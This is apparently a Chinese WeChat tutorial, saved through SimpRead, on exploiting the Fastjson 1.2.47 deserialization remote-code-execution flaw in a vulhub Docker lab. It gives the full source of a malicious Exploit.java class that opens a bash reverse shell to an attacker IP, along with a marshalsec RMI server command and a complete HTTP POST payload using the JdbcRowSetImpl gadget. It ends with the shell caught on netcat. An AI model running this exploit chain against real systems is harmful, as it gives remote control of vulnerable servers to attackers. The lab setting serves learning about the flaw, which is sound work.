> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6eaYIiI-tJq1AoFsHudMyA)

环境搭建:

Fastjson 靶机 ip：192.168.21.10 （假设公网）

Kali 开启 rmi 服务并 nc 监听 ip ：192.168.10.12（假设公网）

Win 服务器开启 http 服务存放 Exploit.class 文件 ip：192.168.21.11 （假设公网）

使用 docker 和 vulhub；

安装好后使用进入到 /vulhub/fastjson/1.2.47-rce/ 中

使用 sudo docker-compose up -d 启动环境

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfib7qFyrAVKibGPRmkV65Nbda9vEtc3uGySOYcr3ftAVzp6xTia1iciaH08RA/640?wx_fmt=png)

访问下本地的 8090 端口查看是否启动

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibXo1yB3Yic5CmDgBHQ9UYicwYcPu5gibbK4s8drAzVCtaMxZQtljWTL8JA/640?wx_fmt=png)

出现这个说明成功启动 fastjson 环境了

然后先去攻击机编译一个恶意的 java 的 class 文件为之后做铺垫

新添加一个 Exploit.java 文件

Exploit.java 的内容为

```
import java.lang.Runtime;import java.lang.Process;public class Exploit {   static {       try {           Runtime r = Runtime.getRuntime();           Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/192.168.21.12/5555 0>&1"});           p.waitFor();       } catch (Exception e) {           // do nothing       }   }}
```

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibqwXwG6Eo6CQ9cCKWO1C3POJ0TJUrpZRWIqTcOm1kS7Z3gerEt8fcWw/640?wx_fmt=png)

箭头那里修改自己的 nc 要监听的 ip 和端口

然后编译成 class 文件

命令：javac Exploit.java

生成了 Exploit.class

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibm04dGuIdxR8Y3joF2qGmevgRJoibR5FFI1RwLZuF6YDB01OUQYbdEhQ/640?wx_fmt=png)

（注意：javac 版本最好与目标服务器接近，否则目标服务器可能无法解析 class 文件，会报错，建议 vulhub 搭建的话使用 Java 1.8.0_101 版本去编译）

然后开一起一个 http 服务，可以访问 class 文件并可以下载就可以了

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibrUtT6dia0ickrnic1G54nAQZicLE60Q3dJwwLYsIicCdSzKxDuUQEN0ic7DQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibOGe147l3aCsgM0ICHw0j4gtpHyxP3ERweYlOczGv4Q1DeyjsIcpj6w/640?wx_fmt=png)

接着在自己的 vps 里开启 rmi 或者 ldap 服务  

下载地址  https://github.com/mbechler/marshalsec

可以使用 git clone https://github.com/mbechler/marshalsec.git

也可以直接下载拖进去

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibib2iaicHjhQS0rqTWa5r6yZWlqzJlJcsHqdS06KHLIC500vdRxeHoySNA/640?wx_fmt=png)

下载好后然后解压 sudo unzip marshalsec-master.zip

进入到这个目录里执行 sudo mvn clean package -DskipTests 进行编译

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibS5z1gndcZ0gNljJpz9H1cxxgC04VooiafUAVal6eu7hWW1lKwIW4rNg/640?wx_fmt=png)

编译好后会生成一个 target 文件，进入这个目录

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibXykytia6yu3A36SAeNbypmmFAssYHFdm1gOePSHKPNjUeiaJntXiaiak1Q/640?wx_fmt=png)

需要使用到这个文件  

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibBaSXbFre7Il1kkN1f14DyPpQfkYp8O2icrCppYRESLcV4F9KvKYxibmQ/640?wx_fmt=png)

然后使用

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.21.11/exp/#Exploit" 9999
```

开启 RMI 服务

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibZRLHJhnajvrAu15J8cvf9hxTrg4gEaDqlAQWQuwwQibqhWm50lr62Ng/640?wx_fmt=png)

然后开启 nc 监听

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibbCRcVNjibMw5LicAStzk4mGQFlv8rE4DytNMSCyNMb0kzYtJXSp87RjQ/640?wx_fmt=png)

接下来然后这个页面进行抓包

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibluiarluG0LeSjRQvz6QLm2mY8dJy3c1Bialibc51mzgPdK8rvbZxrznDg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibh1vMKLoJeMpyOl3JVsAicWKPSqpibDr9NayvdtzWA9YjMkr4coCNlHyQ/640?wx_fmt=png)

然后将 GET 改为 POST 然后添加 1.2.47 的 payload

```
POST / HTTP/1.1Host: 192.168.21.10:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263{    "a":{        "@type":"java.lang.Class",        "val":"com.sun.rowset.JdbcRowSetImpl"    },    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"rmi://192.168.21.12:9999/Exploit",        "autoCommit":true    }}
```

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibia7wU2AAicnUOldKImxxtYV5KxjibSqxfN6K3XJ3CiaXqkMHdDdpftR4rA/640?wx_fmt=png)

箭头指向的是 kali 机器开启 rmi 的地址

然后 rmi 服务就会收到请求去加载 Exploit.class

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibx8hiccPRPEJYorcEz1PibTboO5h7Yhia6ulvO43PEr8XeQ399WWuv5FKA/640?wx_fmt=png)

成功反弹到了 nc 上

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2Cn0y1X24gCLelLGW3OfFLfibOXvQYuOO7k1Mvm7WHYtWsgKjcQsPkUicI5rzibMVibia9YvicQtqLwXicT8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bXN3icEpm2ClpO2mPkroibfba4Cv7icY1I5qwSRibnmmefyAIwbWqmiba9G61ssmppc4nVIGLicFxgTnlqvuf2sic2Niag/640?wx_fmt=png)